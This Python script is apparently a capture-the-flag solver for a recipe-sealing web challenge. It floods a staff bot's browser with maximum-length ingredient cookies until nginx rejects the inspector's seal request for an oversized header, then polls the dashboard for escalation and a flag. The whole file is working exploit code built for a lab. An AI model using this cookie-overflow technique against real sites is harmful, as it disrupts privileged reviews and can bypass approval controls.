#!/usr/bin/env python3
"""Jam the inspector's own seal request past the real limit, then watch for escalation.

Measured this session: nginx answers `400 Request Header Or Cookie Too Large` once the
Cookie header passes ~8 KB (7255 B -> app's own 403, 8320 B -> nginx 400). mixer.js runs
inside the staff browser and writes one cookie per ingredient before it POSTs /api/seal,
so a batch with 80+ max-length ingredients (name 48 + value 64 = 115 B each) makes the
inspector's verdict request die at nginx and never reach the application.

That is the state a "very busy Chief" robot exists to handle, and the previous run's
re-test was invalid: it used 200-char values, which the server truncates to 64, so the
"overflow" batch really carried 7.5 KB - under the limit - and sealed normally.

Oracle is /dashboard only: one row per batch with a status pill and a Seal cell.
"""
import re
import sys
import time

from cc import new_baker

NAME = lambda i: ("i%03d" % i) + "z" * 43          # 48 chars
VAL = "x" * 64                                      # 64 chars
PER = 48 + 1 + 64 + 2                               # 115 bytes per cookie
WATCH_MIN = int(sys.argv[1]) if len(sys.argv) > 1 else 25
FAST_S = int(sys.argv[2]) if len(sys.argv) > 2 else 15


def log(*a):
    line = "[%s] %s" % (time.strftime("%H:%M:%S"), " ".join(str(x) for x in a))
    sys.stdout.buffer.write((line + "\n").encode("utf-8", "replace"))
    sys.stdout.flush()


def rows(c):
    code, dash, dt = c.get("/dashboard")
    if not isinstance(dash, str):
        return {}
    out = {}
    for block in re.finditer(r"<tr>(.*?)</tr>", dash, re.S):
        b = block.group(1)
        rid = re.search(r"/recipe/([0-9a-f]{24})", b)
        if not rid:
            continue
        status = re.search(r'class="pill (\w+)">(\w+)</span>', b)
        after = b.split("</span>")[-1]
        seal = re.sub(r"<[^>]+>", " ", after)
        seal = " ".join(seal.split())[:40]
        out[rid.group(1)] = (status.group(2) if status else "?", seal)
    flag = re.findall(r"sun\{[^{}\r\n]{1,160}\}", dash)
    gold = bool(re.search(r'class="[^"]*(gold|flag)', dash))
    return {"_flag": flag, "_gold": gold, **out}


def submit(c, rid):
    for i in range(40):
        code, out, dt = c.post("/api/recipe/%s/submit" % rid, {})
        if isinstance(out, dict) and out.get("ok"):
            return True
        log("   submit %s -> %s %s (retry %d)" % (rid[:6], code, str(out)[:60], i))
        time.sleep(15)
    return False


u, c, _ = new_baker("of")
log("user", u)

spec = [("A control 2", 2), ("B just-over 80", 80), ("C max 300", 300), ("D control again", 2)]
ids = []
for tag, n in spec:
    ings = [{"name": "flour", "value": "1cup"}, {"name": "sugar", "value": "2tbsp"}] if n == 2 \
        else [{"name": NAME(i), "value": VAL} for i in range(n)]
    code, out, dt = c.post("/api/recipe", {"title": tag, "ingredients": ings})
    rid = out["id"]
    got = 0
    ids.append((tag, rid))
    log("saved %-16s %s %dB cookies" % (tag, rid[:8], len(ings) * PER if n > 2 else 24))

t0 = time.time()
for tag, rid in ids:
    ok = submit(c, rid)
    log("submitted %s %s (%.1fs after start)" % (tag, rid[:8], time.time() - t0))
    time.sleep(3)

seen = {}
while time.time() - t0 < WATCH_MIN * 60:
    time.sleep(FAST_S if time.time() - t0 < 600 else 90)
    st = rows(c)
    fl, gold = st.pop("_flag", []), st.pop("_gold", False)
    if fl or gold:
        log("!!! flag-shaped dashboard: %s gold=%s" % (fl, gold))
        open("../flag.txt", "w", encoding="utf-8").write((fl[0] if fl else "") + "\n")
        sys.exit(0)
    for rid, sig in st.items():
        if seen.get(rid) != sig:
            log("  t+%5ds %s %s -> %s" % (int(time.time() - t0), rid[:8],
                                          next(t for t, r in ids if r == rid), sig))
            seen[rid] = sig
log("watch over. final states:")
for tag, rid in ids:
    log("   %-16s %s" % (tag, seen.get(rid)))
